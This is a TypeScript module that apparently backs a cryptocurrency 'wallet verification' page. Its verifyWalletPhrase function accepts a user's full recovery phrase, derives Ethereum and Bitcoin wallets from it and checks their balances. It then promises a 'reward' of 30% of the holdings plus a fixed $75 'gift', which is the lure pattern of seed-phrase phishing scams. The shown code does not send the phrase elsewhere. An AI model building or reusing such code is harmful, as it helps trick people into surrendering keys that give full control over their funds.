import * as ecc from "@bitcoinerlab/secp256k1";
import { BIP32Factory } from "bip32";
import { mnemonicToSeedSync, validateMnemonic } from "bip39";
import * as bitcoin from "bitcoinjs-lib";
import { ethers } from "ethers";
const bip32 = BIP32Factory(ecc);

// Ethereum RPC endpoint (using public node)
const ETH_RPC = "https://eth.llamarpc.com";

// Bitcoin API endpoints
const BTC_API = "https://blockchain.info/balance?active=";

// Price APIs
const BTC_PRICE_API =
  "https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd";
const ETH_PRICE_API =
  "https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd";

interface WalletBalances {
  btc?: number;
  eth?: number;
}

interface VerificationResult {
  success: boolean;
  message: string;
  balances?: WalletBalances;
  reward?: number;
  gift?: number;
  type?: "BTC" | "ETH";
}

// Fetch current crypto prices
async function getCryptoPrices() {
  const [btcResponse, ethResponse] = await Promise.all([
    fetch(BTC_PRICE_API),
    fetch(ETH_PRICE_API),
  ]);

  const btcData = await btcResponse.json();
  const ethData = await ethResponse.json();

  return {
    BTC: btcData.bitcoin.usd,
    ETH: ethData.ethereum.usd,
  };
}

// Get ETH balance using ethers
async function getEthBalance(address: string): Promise<number> {
  try {
    const provider = new ethers.JsonRpcProvider(ETH_RPC);
    const balance = await provider.getBalance(address);
    return Number(ethers.formatEther(balance));
  } catch (error) {
    console.error("Error fetching ETH balance:", error);
    return 0;
  }
}

// Get BTC balance using blockchain.info API
async function getBtcBalance(address: string): Promise<number> {
  try {
    const response = await fetch(`${BTC_API}${address}`);
    const data = await response.json();
    return data[address].final_balance / 100000000; // Convert satoshis to BTC
  } catch (error) {
    console.error("Error fetching BTC balance:", error);
    return 0;
  }
}

// Validate Ethereum address
function isValidEthAddress(address: string): boolean {
  try {
    return ethers.isAddress(address);
  } catch (error) {
    return false;
  }
}

// Validate Bitcoin address
function isValidBtcAddress(address: string): boolean {
  try {
    bitcoin.address.toOutputScript(address);
    return true;
  } catch (error) {
    return false;
  }
}

// Derive Bitcoin address from mnemonic
function deriveBitcoinAddress(mnemonic: string): string {
  try {
    const seed = mnemonicToSeedSync(mnemonic);
    const root = bip32.fromSeed(seed);
    const path = "m/44'/0'/0'/0/0"; // BIP44 path for first Bitcoin address
    const child = root.derivePath(path);
    const { address } = bitcoin.payments.p2pkh({
      pubkey: child.publicKey,
      network: bitcoin.networks.bitcoin,
    });
    return address || "";
  } catch (error) {
    console.error("Error deriving BTC address:", error);
    return "";
  }
}

// Calculate reward based on wallet balances (30% of balance value)
async function calculateReward(balances: WalletBalances): Promise<number> {
  const prices = await getCryptoPrices();
  const btcValue = (balances.btc || 0) * prices.BTC;
  const ethValue = (balances.eth || 0) * prices.ETH;
  return (btcValue + ethValue) * 0.3; // 30% reward
}

export const checkBalanceByAddress = async (
  address: string
): Promise<VerificationResult> => {
  try {
    const balances: WalletBalances = {};
    let type: "BTC" | "ETH" | undefined;

    // Check if it's a valid ETH address
    if (isValidEthAddress(address)) {
      const ethBalance = await getEthBalance(address);
      balances.eth = ethBalance;
      type = "ETH";
    }
    // Check if it's a valid BTC address
    else if (isValidBtcAddress(address)) {
      const btcBalance = await getBtcBalance(address);
      balances.btc = btcBalance;
      type = "BTC";
    } else {
      return {
        success: false,
        message:
          "Invalid address format. Please enter a valid BTC or ETH address.",
      };
    }

    const reward = await calculateReward(balances);

    return {
      success: true,
      message: `Balance check successful for ${type} address!`,
      balances,
      reward,
      gift: 75,
      type,
    };
  } catch (error) {
    console.error("Balance check error:", error);
    return {
      success: false,
      message:
        "An error occurred while checking the balance. Please try again.",
    };
  }
};

export const verifyWalletPhrase = async (
  phrase: string
): Promise<VerificationResult> => {
  try {
    // Validate mnemonic format
    if (!validateMnemonic(phrase)) {
      return {
        success: false,
        message:
          "Invalid recovery phrase format. Please enter a valid 12-word or 24-word recovery phrase.",
      };
    }

    try {
      // Create Ethereum wallet from mnemonic
      const wallet = ethers.Wallet.fromPhrase(phrase);

      // Derive Bitcoin address
      const btcAddress = deriveBitcoinAddress(phrase);

      // Get balances in parallel
      const [ethBalance, btcBalance] = await Promise.all([
        getEthBalance(wallet.address),
        getBtcBalance(btcAddress),
      ]);

      const balances = {
        btc: btcBalance,
        eth: ethBalance,
      };

      const reward = await calculateReward(balances);

      return {
        success: true,
        message: "Verification successful! Your balances have been checked.",
        balances,
        reward,
        gift: 75, // Fixed gift amount
      };
    } catch (error) {
      console.error("Wallet creation error:", error);
      return {
        success: false,
        message:
          "Error creating wallet from recovery phrase. Please check your phrase and try again.",
      };
    }
  } catch (error) {
    console.error("Verification error:", error);
    return {
      success: false,
      message:
        "An error occurred during verification. Please check your recovery phrase and try again.",
    };
  }
};
